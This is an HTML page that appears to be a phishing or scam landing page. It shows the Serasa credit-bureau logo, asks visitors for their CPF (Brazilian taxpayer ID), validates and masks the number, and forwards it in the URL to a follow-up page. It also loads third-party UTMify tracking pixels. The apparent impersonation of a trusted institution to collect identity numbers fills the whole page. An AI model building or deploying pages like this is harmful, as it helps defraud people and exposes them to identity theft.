<!DOCTYPE html>
<html lang="en">
<head>


  <script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.pixelId = "68917b90ddb4765a12824441";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>


    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="./css/documento.css">
</head>
<body>

<form id="cpfForm" action="#" method="get">

    <img src="./img/serasa-logo.svg" alt="" srcset="">
    <h3 class="h3_doc">Digite seu CPF</h3>

    <div id="inputContainer" class="inputContainer inputContainerHover">
        <input name="cpf" id="cpf" placeholder="000.000.000-00" type="text" required>
    </div>

    <p class="error" id="error"></p>

    <button id="continuar" class="continuar" type="submit">Continuar</button>
</form>




     <script defer>
  const form = document.getElementById("cpfForm");

  form.addEventListener("submit", function(e) {
    e.preventDefault(); // previne envio padrão

    const cpfInput = document.getElementById("cpf").value.trim();
    if (!cpfInput) {
      document.getElementById("error").textContent = "Por favor, digite seu CPF.";
      return;
    }

    // Pega os parâmetros atuais da URL
    const currentParams = window.location.search;
    const urlParams = new URLSearchParams(currentParams);

    // Adiciona o CPF
    urlParams.set("cpf", cpfInput);

    // Monta a URL final para o formulário
    const finalUrl = `./atende.html?${urlParams.toString()}`;

    // Redireciona
    window.location.href = finalUrl;
  });
</script>




 <script>
const input = document.getElementById('cpf');
const containerCpf = document.getElementById('inputContainer');
const ButtonSubmit = document.getElementById('continuar');
const errorMsg = document.getElementById('error');



ButtonSubmit.disabled = true
function validarCPF(cpf) {
  cpf = cpf.replace(/\D/g, '');
  if (cpf.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cpf)) return false;

  const nums = cpf.split('').map(n => parseInt(n, 10));

  function calcDV(sliceLen) {
    let soma = 0, peso = sliceLen + 1;
    for (let i = 0; i < sliceLen; i++) soma += nums[i] * peso--;
    const resto = soma % 11;
    return resto < 2 ? 0 : 11 - resto;
  }

  return calcDV(9) === nums[9] && calcDV(10) === nums[10];
}

// --- Máscara ---
function aplicarMascara(valor) {
  valor = valor.replace(/\D/g, '').substring(0, 11);
  if (valor.length > 9) {
    valor = valor.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  } else if (valor.length > 6) {
    valor = valor.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
  } else if (valor.length > 3) {
    valor = valor.replace(/(\d{3})(\d{1,3})/, "$1.$2");
  }
  return valor;
}

let ultimoNumerico = "";

input.addEventListener("input", (e) => {
  let pos = e.target.selectionStart; 
  const valorAntigo = e.target.value;

 
  let numeros = valorAntigo.replace(/\D/g, '');
  if (numeros.length > 11) numeros = numeros.substring(0, 11);

 
  let novoValor = aplicarMascara(numeros);
  e.target.value = novoValor;

 
  let dif = novoValor.length - valorAntigo.length;
  pos = pos + dif;
  if (pos < 0) pos = 0;
  e.target.setSelectionRange(pos, pos);


  if (numeros.length < 11 ) {
    containerCpf.classList.remove('errorContainer')

    ButtonSubmit.disabled = true

          ButtonSubmit.style.background = 'rgba(190, 190, 190, 0.644)';
      ButtonSubmit.style.color = 'rgba(95, 95, 95, 0.877)'

      
  }


  if (numeros.length === 0) {
       errorMsg.innerHTML = "Informe o seu CPF"
  }
  
  if (numeros.length === 11 && numeros !== ultimoNumerico) {
    ultimoNumerico = numeros;
    const valido = validarCPF(numeros);
    if (valido) {
      ButtonSubmit.disabled = false
      containerCpf.classList.remove('errorContainer')
      containerCpf.classList.add('inputContainerHover')
      errorMsg.innerHTML = ''
      
      ButtonSubmit.style.background = 'rgb(230, 56, 136)'
      ButtonSubmit.style.color = 'white'
    } else {
      ButtonSubmit.disabled = true
      containerCpf.classList.add('errorContainer')
      containerCpf.classList.remove('inputContainerHover')
      errorMsg.innerHTML = "Digite um CPF válido"

      ButtonSubmit.style.background = 'rgba(190, 190, 190, 0.644)';
      ButtonSubmit.style.color = 'rgba(95, 95, 95, 0.877)'
    }
 

    const evento = new CustomEvent("cpfValidated", {
      detail: { valid: valido, cpf: numeros }
    });
    input.dispatchEvent(evento);
  }

  if (numeros.length < 11) ultimoNumerico = "";
});


input.addEventListener("paste", (ev) => {
  ev.preventDefault();
  const texto = (ev.clipboardData || window.clipboardData).getData("text");
  const nums = texto.replace(/\D/g, "");
  input.value = aplicarMascara(nums);
  input.dispatchEvent(new Event("input", { bubbles: true }));
});
</script>


    
</body>
</html>